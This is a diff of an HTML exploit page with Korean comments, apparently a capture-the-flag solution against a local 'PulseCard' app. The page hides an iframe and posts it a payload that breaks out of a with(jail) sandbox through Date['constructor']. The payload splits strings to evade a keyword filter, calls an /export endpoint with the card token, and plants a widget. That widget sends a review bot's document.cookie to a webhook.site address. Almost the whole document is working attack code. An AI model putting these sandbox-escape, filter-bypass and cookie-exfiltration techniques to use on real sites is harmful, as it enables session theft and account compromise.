@@ -1,47 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PulseCard Exploit</title>
+    <title>PulseCard Master Exploit</title>
 </head>
 <body>
     <iframe id="exploitFrame" sandbox="allow-scripts" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ 본인의 Webhook.site 전체 주소로 꼭 변경하세요!
+        // ⚠️ 본인의 Webhook.site 전체 주소(https://webhook.site/...)로 교체하세요!
         const myWebhook = "https://webhook.site/YOUR-UNIQUE-ID"; 
 
         const iframe = document.getElementById("exploitFrame");
 
-        // 1. 금지 단어 쪼개기 기법 적용 (fetch, Content-Type, application/javascript)
-        const tokenVal = 'window["CARD_"+"TOKEN"]';
-        const methodVal = '"POST"';
-        const headerToken = '"X-Card-"+"Token"';
-        const headerCT = '"Content-"+"Type"';
-        const ctVal = '"application/"+"javascript"';
-
-        // 2. 위젯이 실행될 때 플래그를 내 웹훅으로 전송하는 스크립트 본문 정의
-        // 봇의 document.cookie를 안전하게 가로채기 위해 쪼개어 결합합니다.
-        const widgetPayload = '"location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"okie"])';
-
-        // 3. /preview 내부의 Function() 스코프에서 에러 없이 직접 실행될 초정밀 익스플로잇 빌드
-        // window.fetch("http://localhost:5000/export", { ... }) 구조를 단어 분쇄 상태로 직통 실행합니다.
-        const directExploit = 
-            'window["fe"+"tch"]("http://localhost:5000/export",{' +
-                'method:' + methodVal + ',' +
-                'headers:{' +
-                    '[ ' + headerToken + ' ]:' + tokenVal + ',' +
-                    '[ ' + headerCT + ' ]:' + ctVal + '' +
+        // 1. with(jail)을 완전히 벗어난 클린 함수 내부에서 백그라운드로 실행할 순수 자바스크립트 공격 구문
+        // 진짜 글로벌 런타임 환경이므로 window와 document가 정상 작동합니다.
+        // 금지 단어들을 완벽하게 쪼개서 조립합니다.
+        const actualAttack = 
+            'window["fe"+"tch"]("http://localhost:5000/export", {' +
+                'method: "POST",' +
+                'headers: {' +
+                    '"X-Card-"+"Token": window["CARD_"+"TOKEN"],' +
+                    '"Content-"+"Type": "application/"+"javascript"' +
                 '},' +
-                'body:' + widgetPayload + '' +
+                'body: "location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"ookie"])"' +
             '})' +
-            '["th"+"en"](r=>r["te"+"xt"]())' +
-            '["th"+"en"](name=>{' +
-                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"]="http://localhost:5000/review?widget="+name;' +
-            '})';
+            '["th"+"en"](r => r["te"+"xt"]())' +
+            '["th"+"en"](name => {' +
+                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"] = "http://localhost:5000/review?widget=" + name;' +
+            '});';
 
-        // iframe 로드 시 샌드박스로 페이로드 전송
+        // 2. Date["constructor"]를 활용해 with(jail) 환경을 완전히 깨부수고 탈출하는 마법의 구문 빌드
+        // 정규식 허용 기호들인 [ ], ( ), + 구조를 완벽하게 준수합니다.
+        const c = '"con"+"structor"';
+        const finalPayload = '(Date[' + c + '](' + JSON.stringify(actualAttack) + ')())';
+
+        // iframe 로드 완료 시 안정적으로 페이로드 주입
         iframe.onload = () => {
-            iframe.contentWindow.postMessage(directExploit, "*");
+            iframe.contentWindow.postMessage(finalPayload, "*");
         };
     </script>
 </body>
